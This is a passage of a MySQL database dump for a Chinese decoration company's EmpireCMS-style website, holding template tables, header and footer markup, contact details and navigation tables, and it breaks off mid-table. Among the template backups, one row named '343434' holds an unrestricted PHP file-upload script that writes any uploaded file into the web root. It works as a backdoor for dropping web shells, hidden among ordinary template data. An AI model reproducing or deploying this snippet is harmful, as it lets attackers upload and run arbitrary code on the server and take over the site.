xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]2,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>公司风采</h2>\r\n                    <p>&nbsp;</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p>\r\n	<br />\r\n</p>\r\n<p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n	[!--newstext--]\r\n</p>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1589783308,'newstemp',1,'admin'),(194,1,'343434','<?php\r\n    if(!empty($_FILES)){\r\n        if($_FILES[\\\"file\\\"][\\\"error\\\"] == 0){\r\n            move_uploaded_file($_FILES[\\\"file\\\"][\\\"tmp_name\\\"],$_FILES[\\\"file\\\"][\\\"name\\\"]);\r\n            echo $_FILES[\\\'file\\\'][\\\'name\\\'].\\\' upload success\\\'; \r\n        }\r\n    }\r\n?>\r\n<form action=\\\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\">\r\n    <input type=\\\"file\\\" name=\\\"file\\\" />\r\n    <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Upload\\\">\r\n</form>',0,0,'',0,0,'',0,0,0,1605874799,'indexpage',1,'admin');
/*!40000 ALTER TABLE `libang_enewstempbak` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstempdt`
--

DROP TABLE IF EXISTS `libang_enewstempdt`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstempdt` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempvar` char(30) NOT NULL DEFAULT '',
  `tempname` char(30) NOT NULL DEFAULT '',
  `tempsay` char(255) NOT NULL DEFAULT '',
  `tempfile` char(200) NOT NULL DEFAULT '',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `temptype` char(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`tempid`),
  UNIQUE KEY `tempvar` (`tempvar`),
  KEY `temptype` (`temptype`),
  KEY `myorder` (`myorder`)
) ENGINE=MyISAM AUTO_INCREMENT=58 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstempdt`
--

LOCK TABLES `libang_enewstempdt` WRITE;
/*!40000 ALTER TABLE `libang_enewstempdt` DISABLE KEYS */;
INSERT INTO `libang_enewstempdt` VALUES (1,'header','主界面头部','主界面头部','e/template/incfile/header.php',0,'incfile'),(2,'footer','主界面尾部','主界面尾部','e/template/incfile/footer.php',0,'incfile'),(3,'qDoInfo','管理投稿首页','管理投稿首页','e/template/DoInfo/DoInfo.php',0,'doinfo'),(4,'qChangeClass','投稿选择栏目页','投稿选择栏目页','e/template/DoInfo/ChangeClass.php',0,'doinfo'),(5,'qDoInfoTran','发布投稿上传附件页面','发布投稿上传附件页面','e/template/DoInfo/tran.php',0,'doinfo'),(6,'qAddInfo','发布投稿页','发布投稿页','e/template/DoInfo/AddInfo.php',0,'doinfo'),(7,'qListInfo','默认管理投稿列表页','默认管理投稿列表页','e/data/html/list/qlistinfo.php',0,'doinfo'),(8,'report','提交错误报告页面','提交错误报告页面','e/template/public/report.php',0,'pubtemp'),(9,'payapi','在线支付页面','在线支付页面','e/template/payapi/payapi.php',0,'pubtemp'),(10,'infovote','信息投票页面','信息投票页面','e/template/public/vote.php',0,'pubtemp'),(11,'vote','投票插件页面','投票插件页面','e/template/tool/vote.php',0,'pubtemp'),(12,'ShopBurcar','购物车页面','购物车页面','e/template/ShopSys/buycar.php',0,'shopsys'),(13,'ShopOrder','提交订单页面','提交订单页面','e/template/ShopSys/order.php',0,'shopsys'),(14,'ShopSubmitOrder','确认提交订单页面','确认提交订单页面','e/template/ShopSys/SubmitOrder.php',0,'shopsys'),(15,'ShopListDd','订单列表页面','订单列表页面','e/template/ShopSys/ListDd.php',0,'shopsys'),(16,'ShopShowDd','订单详细页面','订单详细页面','e/template/ShopSys/ShowDd.php',0,'shopsys'),(17,'ShopBurcarForm','购物车-加入表单模板','购物车-加入表单模板','e/template/ShopSys/buycar/buycar_form.php',0,'shopsys'),(18,'ShopBurcarOrder','购物车-确认订单模板','购物车-确认订单模板','e/template/ShopSys/buycar/buycar_order.php',0,'shopsys'),(19,'ShopBurcarShowdd','购物车-显示订单模板','购物车-显示订单模板','e/template/ShopSys/buycar/buycar_showdd.php',0,'shopsys'),(20,'ShopAddAddress','增加配送地址页面','增加配送地址页面','e/template/ShopSys/AddAddress.php',0,'shopsys'),(21,'ShopListAddress','管理配送地址页面','管理配送地址页面','e/template/ShopSys/ListAddress.php',0,'shopsys'),(22,'MemberReg','会员注册页面','会员注册页面','e/template/member/register.php',0,'member'),(23,'MemberChangeReg','选择注册类型页面','选择注册类型页面','e/template/member/ChangeRegister.php',0,'member'),(24,'MemberRegsend','重发注册激活邮件页面','重发注册激活邮件页面','e/template/member/regsend.php',0,'member'),(25,'MemberLogin','会员登录页面','会员登录页面','e/template/member/login.php',0,'member'),(26,'MemberLoginopen','会员登录弹出页面','会员登录弹出页面','e/template/member/loginopen.php',0,'member'),(27,'MemberEditinfo','修改会员信息页面','修改会员信息页面','e/template/member/EditInfo.php',0,'member'),(28,'MemberEditsafeinfo','修改会员安全信息页面','修改会员安全信息页面','e/template/member/EditSafeInfo.php',0,'member'),(29,'MemberGetPassword','取回密码页面','取回密码页面','e/template/member/GetPassword.php',0,'member'),(30,'MemberGetResetPass','取回密码重置页面','取回密码重置页面','e/template/member/getpass.php',0,'member'),(31,'MemberCp','会员中心首页','会员中心首页','e/template/member/cp.php',0,'member'),(32,'MemberMy','会员状态页面','会员状态页面','e/template/member/my.php',0,'member'),(33,'MemberShowInfo','查看会员信息页面','查看会员信息页面','e/template/member/ShowInfo.php',0,'member'),(34,'MemberList1','默认会员列表页面','默认会员列表页面','e/template/member/memberlist/1.php',0,'member'),(35,'MemberAddMsg','发送站内消息页面','发送站内消息页面','e/template/member/AddMsg.php',0,'membermsg'),(36,'MemberMsg','站内消息列表页面','站内消息列表页面','e/template/member/msg.php',0,'membermsg'),(37,'MemberViewMsg','查看站内消息页面','查看站内消息页面','e/template/member/ViewMsg.php',0,'membermsg'),(38,'MemberAddFriend','增加好友页面','增加好友页面','e/template/member/AddFriend.php',0,'memberfriend'),(39,'MemberFriend','好友列表页面','好友列表页面','e/template/member/friend.php',0,'memberfriend'),(40,'MemberFriendClass','好友分类页面','好友分类页面','e/template/member/FriendClass.php',0,'memberfriend'),(41,'MemberChangeFriend','选择好友页面','选择好友页面','e/template/member/ChangeFriend.php',0,'memberfriend'),(42,'MemberAddFava','增加收藏信息页面','增加收藏信息页面','e/template/member/AddFava.php',0,'memberfav'),(43,'MemberFava','管理收藏页面','管理收藏页面','e/template/member/fava.php',0,'memberfav'),(44,'MemberFavaClass','管理收藏分类页面','管理收藏分类页面','e/template/member/FavaClass.php',0,'memberfav'),(45,'MemberBuybak','充值记录页面','充值记录页面','e/template/member/buybak.php',0,'memberother'),(46,'MemberDownbak','下载记录页面','下载记录页面','e/template/member/downbak.php',0,'memberother'),(47,'MemberBuygroup','购买会员类型页面','购买会员类型页面','e/template/member/buygroup.php',0,'memberother'),(48,'MemberCard','点卡充值页面','点卡充值页面','e/template/member/card.php',0,'memberother'),(49,'MemberChangeStyle','选择会员空间风格页面','选择会员空间风格页面','e/template/member/mspace/ChangeStyle.php',0,'memberspace'),(50,'MemberSetSpace','设置会员空间页面','设置会员空间页面','e/template/member/mspace/SetSpace.php',0,'memberspace'),(51,'MemberFeedback','管理会员空间反馈页面','管理会员空间反馈页面','e/template/member/mspace/feedback.php',0,'memberspace'),(52,'MemberShowFeedback','查看会员空间反馈页面','查看会员空间反馈页面','e/template/member/mspace/ShowFeedback.php',0,'memberspace'),(53,'MemberGbook','管理会员空间留言页面','管理会员空间留言页面','e/template/member/mspace/gbook.php',0,'memberspace'),(54,'MemberReGbook','回复会员空间留言页面','回复会员空间留言页面','e/template/member/mspace/ReGbook.php',0,'memberspace'),(55,'MemberConnectListBind','登录绑定管理页面','登录绑定管理页面','e/template/memberconnect/ListBind.php',0,'memberconnect'),(56,'MemberConnectTobind','绑定登录帐号页面','绑定登录帐号页面','e/template/memberconnect/tobind.php',0,'memberconnect'),(57,'InfoViewLevel','信息权限提示页面','查看信息权限提示页面','e/template/public/checklevel/info1.php',0,'pubtemp');
/*!40000 ALTER TABLE `libang_enewstempdt` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstempgroup`
--

DROP TABLE IF EXISTS `libang_enewstempgroup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstempgroup` (
  `gid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `gname` varchar(60) NOT NULL DEFAULT '',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`gid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstempgroup`
--

LOCK TABLES `libang_enewstempgroup` WRITE;
/*!40000 ALTER TABLE `libang_enewstempgroup` DISABLE KEYS */;
INSERT INTO `libang_enewstempgroup` VALUES (1,'默认模板组',1);
/*!40000 ALTER TABLE `libang_enewstempgroup` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstempvar`
--

DROP TABLE IF EXISTS `libang_enewstempvar`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstempvar` (
  `varid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `myvar` varchar(60) NOT NULL DEFAULT '',
  `varname` varchar(60) NOT NULL DEFAULT '',
  `varvalue` mediumtext NOT NULL,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `isclose` tinyint(1) NOT NULL DEFAULT '0',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`varid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstempvar`
--

LOCK TABLES `libang_enewstempvar` WRITE;
/*!40000 ALTER TABLE `libang_enewstempvar` DISABLE KEYS */;
INSERT INTO `libang_enewstempvar` VALUES (1,'header','页面头部','<div class=\\\"header\\\">\r\n    <div class=\\\"header_center\\\">\r\n        <h1 class=\\\"logo wow zoomIn\\\"><a href=\\\"/\\\"><img width=\\\"64px\\\" height=\\\"64px\\\" src=\\\"/images/logo.png\\\" title=\\\"南充市丽邦装饰工程有限公司\\\" alt=\\\"南充市丽邦装饰工程有限公司\\\" /><img class=\\\"logo_txt\\\" src=\\\"/images/logo_txt.png\\\" alt=\\\"\\\"></a></h1>\r\n        <div class=\\\"tel\\\">\r\n            <p>15196780978</p>\r\n            <p>18190610788</p>\r\n            <span>0817-3618388</span>\r\n        </div>\r\n       \r\n<div class=\\\"mune\\\">\r\n    <svg t=\\\"1570411005191\\\" class=\\\"icon\\\" viewBox=\\\"0 0 1024 1024\\\" version=\\\"1.1\\\" xmlns=\\\"http://www.w3.org/2000/svg\\\" p-id=\\\"8542\\\" width=\\\"32\\\" height=\\\"32\\\"><path d=\\\"M905.848832 706.56c22.84544 0 41.744384 18.75968 41.744384 41.603072 0 23.6032-18.898944 42.364928-41.744384 42.364928L301.010944 790.528c-22.833152 0-41.728-18.75968-41.728-42.364928 0-22.843392 18.896896-41.603072 41.728-41.603072L905.848832 706.56zM139.56096 215.488512c29.927424 0 53.557248 24.406016 53.557248 53.54496 0 29.927424-23.631872 53.559296-53.557248 53.559296C110.422016 322.592768 86.016 298.960896 86.016 269.033472 86.016 239.894528 110.422016 215.488512 139.56096 215.488512L139.56096 215.488512zM301.010944 317.44c-22.833152 0-41.728-19.13856-41.728-41.984s18.896896-41.984 41.728-41.984l604.837888 0c22.84544 0 41.744384 19.13856 41.744384 41.984s-18.898944 41.984-41.744384 41.984L301.010944 317.44zM301.010944 569.344c-22.833152 0-41.728-19.140608-41.728-41.984s18.896896-41.984 41.728-41.984l604.837888 0c22.84544 0 41.744384 19.140608 41.744384 41.984s-18.898944 41.984-41.744384 41.984L301.010944 569.344zM139.56096 458.835968c29.927424 0 53.557248 23.63392 53.557248 53.557248 0 29.140992-23.631872 53.557248-53.557248 53.557248C110.422016 565.950464 86.016 541.534208 86.016 512.393216 86.016 482.46784 110.422016 458.835968 139.56096 458.835968L139.56096 458.835968zM139.56096 701.407232c29.927424 0 53.557248 24.420352 53.557248 53.559296 0 29.925376-23.631872 53.54496-53.557248 53.54496C110.422016 808.511488 86.016 784.893952 86.016 754.968576 86.016 725.827584 110.422016 701.407232 139.56096 701.407232L139.56096 701.407232z\\\" p-id=\\\"8543\\\" fill=\\\"#253f8e\\\"></path></svg>        \r\n    </div>\r\n    </div>\r\n    <div class=\\\"nav_bg\\\">\r\n        <div class=\\\"nav\\\">\r\n            <ul>\r\n                <li class=\\\"nav_active\\\"><a href=\\\"/\\\">网站首页</a></li>\r\n                <li><a href=\\\"/cpzx/gnxdp/\\\">产品中心</a></li>\r\n                <li><a href=\\\"/gywm/gsjj/\\\">关于我们</a></li>\r\n                <li><a href=\\\"/xwzx/qyzx/\\\">新闻资讯</a></li>\r\n                <li><a href=\\\"/gcal/zxal/\\\">最新案例</a></li>\r\n                <li><a href=\\\"/gcal/jdal/\\\">经典案例</a></li>\r\n                <li><a href=\\\"/gssl/ryzz/\\\">公司实力</a></li>\r\n                <li><a href=\\\"/lxwm/\\\">联系我们</a></li>\r\n            </ul>\r\n        </div>\r\n    </div>\r\n</div>',0,0,1),(2,'footer','页面尾部','<div class=\\\"footer\\\">\r\n    <div class=\\\"footer1\\\">\r\n        <div class=\\\"ewm wow rollIn\\\"><img src=\\\"/images/ewm.jpg\\\" /><p>扫一扫，关注我们</p></div>\r\n        <div class=\\\"bot_nav\\\">\r\n            <div class=\\\"bot_nav1\\\">\r\n                <a href=\\\"/cpzx/gnxdp/\\\">产品中心</a>\r\n                <a href=\\\"/gywm/gsjj/\\\">关于我们</a>\r\n                <a href=\\\"/xwzx/qyzx/\\\">新闻资讯</a>\r\n                <a href=\\\"/gcal/zxal/\\\">最新案例</a>\r\n                <a href=\\\"/gcal/jdal/\\\">经典案例</a>\r\n                <a href=\\\"/gssl/rrzz/\\\">公司实力</a>\r\n                <a href=\\\"/lxwm/\\\">联系我们</a>\r\n            </div>\r\n        </div>\r\n        <div class=\\\"bot_txt\\\">\r\n            <span>手  机：15196780978(王经理)</span><span>座  机：0817-3618388</span><span>邮  箱：1024957682@qq.com</span>\r\n            <span>地  址：四川省南充市川东北金融广场五栋18-22号</span>\r\n        </div>\r\n        <div class=\\\"copy\\\">Copyrights  南充市丽邦装饰工程有限公司版权所有    <a href=\\\"https://beian.miit.gov.cn/#/Integrated/index\\\" target=\\\"_blank\\\" style=\\\"color:#fff\\\">蜀ICP备14005687号-1</a><br>\r\n        技术支持 ：<a href=\\\"https://www.shunking.cn/\\\" style=\\\"color: #fff\\\"> 舜王科技</a>\r\n        </div>\r\n\r\n    </div>\r\n\r\n</div>\r\n<style>\r\n       .bot_txt span {\r\n    margin-right: 28px;\r\n}\r\n</style>\r\n<div class=\\\"footers\\\">\r\n    <ul>\r\n        <li><p><img src=\\\"/images/b_ico1.png\\\" /><a href=\\\"/\\\">首页</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico2.png\\\" /><a href=\\\"tel:15196780978\\\">一键呼叫</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico3.png\\\" /><a href=\\\"/cpzx/gnxdp/\\\">产品中心</a></p></li>\r\n        <li><p><img src=\\\"/images/b_ico4.png\\\" /><a href=\\\"/gywm/gsjj/\\\">关于我们</a></p></li>\r\n    </ul>\r\n</div>',0,0,0),(3,'tel','侧栏联系我们','<div class=\\\"ny_con\\\">\r\n                <ul>\r\n                    <li>\r\n                        <h1>联系我们</h1>\r\n                        <img src=\\\"/images/ny_lxwm.jpg\\\" alt=\\\"\\\">\r\n                        <p>\r\n                            手  机：15196780978(王经理)<br />\r\n                            邮  箱：1024957682@qq.com<br />\r\n                            地  址：四川省南充市川东北金融广场五栋18-22号\r\n                        </p>\r\n                    </li>\r\n                </ul>\r\n            </div>',0,0,0),(4,'infoarea','分类信息区域导航','<table width=\\\"96%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"0\\\" cellspacing=\\\"4\\\">\r\n	<tr>\r\n		<td width=\\\"33%\\\"><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=东城区\\\">东城区</a></td>\r\n		<td width=\\\"33%\\\"><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=西城区\\\">西城区</a></td>\r\n		<td width=\\\"33%\\\"><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=通州区\\\">通州区</a></td>\r\n	</tr>\r\n	<tr>\r\n		<td><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=崇文区\\\">崇文区</a></td>\r\n		<td><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=宣武区\\\">宣武区</a></td>\r\n		<td><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=大兴区\\\">大兴区</a></td>\r\n	</tr>\r\n	<tr>\r\n		<td><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" /><a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=朝阳区\\\">&nbsp;朝阳区</a></td>\r\n		<td><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=海淀区\\\">海淀区</a></td>\r\n		<td><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=昌平区\\\">昌平区</a></td>\r\n	</tr>\r\n	<tr>\r\n		<td><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=丰台区\\\">丰台区</a></td>\r\n		<td><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=石景山区\\\">石景山区</a></td>\r\n		<td><img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo.php?classid=[!--self.classid--]&ph=1&myarea=其它\\\">其它</a></td>\r\n	</tr>\r\n</table>',0,0,0),(5,'infoclassnav','分类信息分类导航','<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"4\\\" cellspacing=\\\"0\\\">\r\n  <tr>\r\n    <td bgcolor=\\\"#EEF1F4\\\">&nbsp;<img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo/?classid=10\\\"><strong>房屋信息</strong></a></td>\r\n  </tr> \r\n</table>\r\n<table width=\\\"96%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"0\\\" cellspacing=\\\"4\\\">\r\n  <tr>\r\n    <td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=11\\\">房屋求租</a></td>\r\n    <td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=12\\\">房屋出租</a></td>\r\n  		<td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=15\\\">办公用房</a></td>\r\n  </tr>\r\n  <tr>\r\n    <td><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=13\\\">房屋求购</a></td>\r\n    <td><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=14\\\">房屋出售</a></td>\r\n  		<td><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=16\\\">旺铺门面</a></td>\r\n  </tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"4\\\" bgcolor=\\\"#EEF1F4\\\">\r\n  <tr>\r\n    <td>&nbsp;<img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo/?classid=17\\\"><strong>跳蚤市场</strong></a></td>\r\n  </tr>\r\n</table>\r\n<table width=\\\"96%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"0\\\" cellspacing=\\\"4\\\">\r\n  <tr>\r\n    <td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=18\\\">电脑配件</a></td>\r\n    <td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=19\\\">电器数码</a></td>\r\n  		<td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=21\\\">居家用品</a></td>\r\n  </tr>\r\n  <tr>\r\n    <td><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=20\\\">通讯产品</a></td>\r\n    <td><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=21\\\"></a></td>\r\n  		<td>&nbsp;</td>\r\n  </tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"4\\\" cellspacing=\\\"0\\\" bgcolor=\\\"#EEF1F4\\\">\r\n  <tr>\r\n    <td>&nbsp;<img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo/?classid=22\\\"><strong>同城生活</strong></a></td>\r\n  </tr>\r\n</table>\r\n<table width=\\\"96%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"0\\\" cellspacing=\\\"4\\\">\r\n  <tr>\r\n    <td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=23\\\">本地新闻</a></td>\r\n    <td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=24\\\">购物打折</a></td>\r\n  		<td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=26\\\">便民告示</a></td>\r\n  </tr>\r\n  <tr>\r\n    <td><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=25\\\">旅游活动</a></td>\r\n    <td>&nbsp;</td>\r\n  		<td>&nbsp;</td>\r\n  </tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"4\\\" cellspacing=\\\"0\\\" bgcolor=\\\"#EEF1F4\\\">\r\n  <tr>\r\n    <td>&nbsp;<img src=\\\"[!--news.url--]e/data/images/msgnav.gif\\\" width=\\\"5\\\" height=\\\"5\\\" />&nbsp;<a href=\\\"[!--news.url--]e/action/ListInfo/?classid=27\\\"><strong>求职招聘</strong></a></td>\r\n  </tr>\r\n</table>\r\n<table width=\\\"96%\\\" border=\\\"0\\\" align=\\\"center\\\" cellpadding=\\\"0\\\" cellspacing=\\\"4\\\">\r\n  <tr>\r\n    <td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=28\\\">工程技术</a></td>\r\n    <td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=29\\\">财务会计</a></td>\r\n  		<td width=\\\"33%\\\"><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=31\\\">经营管理</a></td>\r\n  </tr>\r\n  <tr>\r\n    <td><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=30\\\">餐饮行业</a></td>\r\n    <td><a href=\\\"[!--news.url--]e/action/ListInfo/?classid=31\\\"></a></td>\r\n  		<td>&nbsp;</td>\r\n  </tr>\r\n</table>',0,0,0),(7,'pl','评论表单','<script>\r\n		  function CheckPl(obj)\r\n		  {\r\n		  if(obj.saytext.value==\\\"\\\")\r\n		  {\r\n		  alert(\\\"您没什么话要说吗？\\\");\r\n		  obj.saytext.focus();\r\n		  return false;\r\n		  }\r\n		  return true;\r\n		  }\r\n		  </script><form action=\\\"[!--news.url--]e/pl/doaction.php\\\" method=\\\"post\\\" name=\\\"saypl\\\" id=\\\"saypl\\\" onsubmit=\\\"return CheckPl(document.saypl)\\\">\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" id=\\\"plpost\\\">\r\n\r\n<tr>\r\n<td><table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" class=\\\"title\\\">\r\n<tr>\r\n<td><strong>发表评论</strong></td>\r\n<td align=\\\"right\\\"><a href=\\\"[!--news.url--]e/pl/?classid=[!--classid--]&amp;id=[!--id--]\\\">共有<span><script type=\\\"text/javascript\\\" src=\\\"[!--news.url--]e/public/ViewClick/?classid=[!--classid--]&id=[!--id--]&down=2\\\"></script></span>条评论</a></td>\r\n</tr>\r\n</table>\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"10\\\" cellpadding=\\\"0\\\">\r\n<tr>\r\n<td><table 